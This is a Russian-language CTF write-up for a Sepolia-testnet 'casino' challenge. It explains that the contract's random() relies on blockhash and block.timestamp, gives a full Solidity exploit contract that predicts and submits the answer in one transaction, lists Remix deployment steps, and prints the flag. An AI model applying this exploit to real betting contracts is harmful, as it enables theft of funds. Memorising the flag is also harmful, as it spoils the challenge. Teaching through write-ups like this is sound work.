WEB-3 Казино

## Дано

Сеть: Ethereum Sepolia

Challenge contract:

```text
0xa8d58d2C110e84C5De16ce9530557a8f38137bCb
```

Формат флага:

```text
KubSTU{...}
```

## Идея

Контракт просит угадать число:

```solidity
guess(uint8 answer)
```

Если `answer == random()`, адрес помечается как решивший и может вызвать
`getFlag()`.

Проблема в том, что `random()` считается из публичных данных блока:

```solidity
blockhash(block.number - 1)
block.timestamp
```

Это не настоящая случайность. Другой контракт может в одной транзакции вызвать
`random()`, получить правильный ответ и сразу передать его в `guess()`.

## Exploit

Создаём в Remix файл `BadRandomnessExploit.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBadRandomnessChallenge {
    function guess(uint8 answer) external;
    function random() external view returns (uint8);
    function getFlag() external view returns (string memory);
}

contract BadRandomnessExploit {
    function solve(address challenge) external {
        uint8 answer = IBadRandomnessChallenge(challenge).random();
        IBadRandomnessChallenge(challenge).guess(answer);
    }

    function getFlag(address challenge) external view returns (string memory) {
        return IBadRandomnessChallenge(challenge).getFlag();
    }
}
```

## Решение через Remix

1. Открыть `https://remix.ethereum.org/`.
2. Создать файл `BadRandomnessExploit.sol`.
<img width="1378" height="560" alt="image" src="https://github.com/user-attachments/assets/56c39d40-d5d7-49f3-a45c-eee582394ced" />
3. Скомпилировать контракт.
<img width="1243" height="480" alt="image" src="https://github.com/user-attachments/assets/d735c22d-89c3-416e-914f-d9aa5e65c40c" />
5. Во вкладке `Deploy & Run Transactions` выбрать `Injected Provider - MetaMask`

6. Установить расширение MetaMask выбрать сеть `Sepolia` и получить несколько монет в каком-нибудь кране (пример крана - https://sepolia-faucet.pk910.de/ )
   
<img width="730" height="521" alt="image" src="https://github.com/user-attachments/assets/c33479ce-ecc1-41eb-a662-25e756cf8c41" />

7. Задеплоить `BadRandomnessExploit`.
<img width="2550" height="1320" alt="Безымянный" src="https://github.com/user-attachments/assets/cd6eea0b-63ee-421b-8dd0-6c09cbd673fe" />

8. Вызвать:

```text
solve(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```

9. После успешной транзакции вызвать:

```text
getFlag(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```
<img width="2550" height="857" alt="Безымянный" src="https://github.com/user-attachments/assets/7f8f2e8f-7f9f-4b08-a46b-215f9abd575f" />


## Flag

```text
KubSTU{bad_randomness_same_tx}
```
